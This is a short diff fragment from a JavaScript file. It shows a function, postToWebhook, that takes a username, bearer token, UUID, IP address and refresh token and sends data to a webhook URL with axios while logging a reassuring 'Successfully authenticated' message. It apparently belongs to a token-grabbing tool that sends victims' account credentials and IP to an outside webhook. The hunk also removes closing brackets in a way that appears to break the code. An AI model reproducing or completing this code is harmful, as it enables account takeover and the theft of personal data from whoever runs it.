@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
   ],
 
         axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
-    ])
+
     
 }
 
